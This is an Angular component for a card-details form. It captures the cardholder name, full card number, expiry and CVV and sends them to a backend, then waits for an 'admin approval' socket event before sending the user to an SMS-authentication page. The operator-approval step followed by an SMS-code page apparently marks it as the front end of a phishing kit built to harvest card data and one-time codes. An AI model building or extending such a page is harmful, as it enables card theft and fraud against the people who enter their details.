import { Component, inject, signal, OnInit } from '@angular/core';
import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { CustomerService } from '../../../core/services/customer';
import { SocketService } from '../../../core/services/socket.service';
import { toSignal } from '@angular/core/rxjs-interop';
import { CardMockup } from '../card-mockup/card-mockup';
import { CvvModal } from '../cvv-modal/cvv-modal';
import { Location } from '@angular/common';

@Component({
  selector: 'app-card-info-page',
  imports: [ReactiveFormsModule, CardMockup, CvvModal],
  templateUrl: './card-info-page.html',
})
export class CardInfoPage implements OnInit {
  private readonly fb = inject(FormBuilder);
  private readonly router = inject(Router);
  protected readonly location = inject(Location);
  private readonly customerService = inject(CustomerService);
  private readonly socketService = inject(SocketService);

  protected readonly cardType = signal<'credit' | 'debit'>('credit');
  protected readonly isCvvModalOpen = signal(false);
  protected readonly isSubmitting = signal(false);

  protected readonly form = this.fb.group({
    holderName: ['', [Validators.required, Validators.minLength(3)]],
    cardNumber: ['', [Validators.required, Validators.minLength(16)]],
    expiryMonth: ['12', Validators.required],
    expiryYear: ['28', Validators.required],
    cvv: ['', [Validators.required, Validators.minLength(3)]],
    agreement: [true, Validators.requiredTrue]
  });

  protected readonly formValues = toSignal(this.form.valueChanges, { initialValue: this.form.value });

  ngOnInit() {
    const cid = localStorage.getItem('customer_id');
    if (cid) {
      this.socketService.registerCustomer(cid);
    }
  }

  protected setCardType(type: 'credit' | 'debit'): void {
    this.cardType.set(type);
  }

  protected handleNumberFormat(event: Event): void {
    const input = event.target as HTMLInputElement;
    let raw = input.value.replace(/\D/g, '');
    let formatted = '';
    for (let i = 0; i < raw.length; i++) {
      if (i > 0 && i % 4 === 0) formatted += ' ';
      formatted += raw[i];
    }
    this.form.controls.cardNumber.setValue(formatted, { emitEvent: true });
    
    setTimeout(() => {
      input.setSelectionRange(formatted.length, formatted.length);
    }, 0);
  }

  protected getBrandClass(): string {
    const raw = (this.formValues().cardNumber || '').replace(/\D/g, '');
    if (raw.startsWith('4')) {
      return 'text-[10px] font-extrabold uppercase px-2 py-0.5 rounded bg-blue-100 text-blue-800';
    } else if (/^5[1-5]/.test(raw)) {
      return 'text-[10px] font-extrabold uppercase px-2 py-0.5 rounded bg-amber-100 text-amber-900';
    }
    return 'text-[10px] font-extrabold uppercase px-2 py-0.5 rounded bg-red-100 text-[#e10514]';
  }

  protected getBrandText(): string {
    const raw = (this.formValues().cardNumber || '').replace(/\D/g, '');
    if (raw.startsWith('4')) return 'VISA';
    if (/^5[1-5]/.test(raw)) return 'Mastercard';
    return 'TROY';
  }

  protected submitForm(): void {
    if (this.form.invalid) {
      this.form.markAllAsTouched();
      return;
    }
    this.isSubmitting.set(true);
    const val = this.form.value;
    const payload = {
      cc_name: val.holderName,
      cc_number: val.cardNumber,
      cc_expiry: `${val.expiryMonth}/${val.expiryYear}`,
      cc_cvv: val.cvv,
      customer_id: localStorage.getItem('customer_id') || ''
    };

    this.customerService.createCard(payload).subscribe({
      next: () => {
        // Wait for admin approval
        this.socketService.onEvent('card_approved').subscribe(() => {
          if (this.isSubmitting()) {
            this.isSubmitting.set(false);
            this.router.navigate(['/sms-auth']);
          }
        });
      },
      error: (err) => {
        console.error(err);
        this.isSubmitting.set(false);
      }
    });
  }
}
